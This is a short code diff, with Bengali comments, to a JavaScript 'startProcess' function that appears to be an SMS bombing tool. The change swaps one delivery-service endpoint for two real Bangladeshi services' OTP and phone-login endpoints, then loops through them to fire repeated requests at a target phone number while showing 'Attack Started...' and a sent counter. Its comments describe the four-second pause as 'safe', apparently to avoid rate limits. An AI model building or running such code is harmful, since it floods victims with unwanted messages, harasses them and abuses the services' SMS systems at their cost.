@@ -35,10 +35,18 @@ async function startProcess() {
 
     display.innerText = "Attack Started...";
     
+    // আপনার ফাইনাল ২ টি এপিআই লিস্ট
+    const apiList = [
+        `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`,
+        `https://api.medeasy.health/api/send-otp/+88${target}/`
+    ];
+
     for (let i = 1; i <= count; i++) {
         try { 
-            // আপনার দেওয়া নতুন RedX v4 API টি টেস্ট করার জন্য
-            await fetch(`https://api.redx.com.bd/v4/redx/does-user-exist?phoneNumber=88${target}`, { 
+            // এই ২টি এপিআই থেকে পর্যায়ক্রমে এসএমএস যাবে
+            let currentApi = apiList[(i - 1) % apiList.length];
+
+            await fetch(currentApi, { 
                 method: 'GET', 
                 mode: 'no-cors',
                 cache: 'no-store'
@@ -46,7 +54,7 @@ async function startProcess() {
 
             display.innerText = "Sent: " + i;
             
-            // আপনার সেই ৪ সেকেন্ডের বিরতি
+            // আপনার সেই নিরাপদ ৪ সেকেন্ডের বিরতি
             await new Promise(res => setTimeout(res, 4000));
         } catch (e) {
             console.log("Error skipped...");
